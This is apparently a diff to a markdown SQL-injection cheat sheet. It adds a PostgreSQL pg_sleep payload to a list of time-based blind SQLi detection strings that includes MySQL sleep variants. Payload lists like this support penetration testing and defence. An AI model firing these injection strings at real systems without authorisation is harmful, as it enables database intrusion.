@@ -1071,6 +1071,7 @@ This one is the easiest of all SQLi attacks.
 - Vulnerability Detection:
 > ```sql
 > SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
+> '; SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
 > 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 > 1'=sleep(25)='1
 > '%2b(select*from(select(sleep(2)))a)%2b'
